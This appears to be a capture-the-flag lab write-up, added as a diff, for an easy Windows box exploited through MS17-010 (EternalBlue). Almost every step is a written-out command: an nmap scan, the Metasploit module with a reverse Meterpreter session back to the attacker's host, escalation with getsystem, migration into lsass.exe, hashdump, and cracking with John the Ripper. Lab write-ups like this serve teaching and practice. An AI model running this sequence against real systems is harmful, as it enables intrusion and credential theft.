@@ -1,0 +1,71 @@
+**Difficulty:** Easy
+**OS:** Windows
+**Date:** 2026-10-17
+
+---
+
+## 1. Reconnaissance
+
+Nmap scan:
+nmap -sV -sC -p- <IP>
+Open ports:
+
+135 (MSRPC)
+
+139 (NetBIOS)
+
+445 (SMB) — Windows 7 / Server 2008 R2
+
+3389 (RDP)
+
+The SMB service is vulnerable to MS17-010 (EternalBlue).
+
+2. Exploitation
+Start Metasploit:
+msfconsole
+
+Use the EternalBlue exploit:
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <IP>
+set LHOST <YOUR_IP>
+set LPORT 4444
+exploit
+
+After successful exploitation, a Meterpreter session opens.
+
+3. Privilege Escalation
+Check current user:
+getuid
+
+Escalate to SYSTEM:
+getsystem
+
+Verify:
+getuid
+
+Migrate to a stable process (e.g., lsass.exe):
+ps
+migrate <PID>
+
+4. Post-Exploitation
+Dump password hashes:
+hashdump
+
+Crack the hashes with John the Ripper:
+john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+5. Flags
+User flag: cat C:\Users\Jon\Desktop\user.txt
+
+Root flag: cat C:\Users\Administrator\Desktop\root.txt
+
+Additional flag: C:\flag1.txt
+
+6. Lessons Learned
+MS17-010 (EternalBlue) is a critical SMB vulnerability.
+
+Metasploit automates exploitation.
+
+getsystem escalates to SYSTEM.
+
+hashdump extracts NTLM hashes for cracking.
